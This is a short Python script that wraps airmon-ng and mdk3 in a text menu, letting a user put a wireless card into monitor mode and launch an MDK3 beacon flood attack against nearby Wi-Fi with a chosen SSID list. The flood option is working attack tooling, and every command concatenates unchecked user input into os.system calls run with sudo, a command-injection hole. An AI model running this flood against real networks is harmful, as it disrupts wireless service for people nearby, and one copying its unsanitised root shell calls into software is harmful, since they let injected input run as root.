import os

def main():
    os.system("clear")
    print('''
    ╔═════════════════════════════╗
    ║ v!e = Enable Monitor Mode   ║           
    ║                             ║
    ║ v!d = Disable Monitor Mode  ║
    ║                             ║
    ║ v!f = MDK3 Flood Attack     ║
    ║                             ║
    ║ v!u = Update Packages       ║
    ╚═════════════════════════════╝''')
    shell = input("shell~$ ")    
    if shell == "v!e":
        os.system("clear")
        card = input("Enter Network Card: ")
        os.system("sudo airmon-ng start " + card)
        os.system("clear")
        main()

    if shell == "v!d":
        os.system("clear")
        card = input("Enter Network Card: ")
        os.system("sudo airmon-ng stop " + card)
        os.system("clear")
        main()

    if shell == "v!f":
        os.system("clear")
        card = input("Enter Network Card: ")
        ssid = input("Enter SSID List: ")
        print("MDK3 Flood Attack Has Started! (CTRL + C = STOP)")
        os.system("sudo mdk3 " + card + " b -a -v " + ssid + " -s 99999")

    if shell == "v!u":
        os.system("sudo apt install mdk3 && sudo apt install aircrack-ng")
        main()

main()
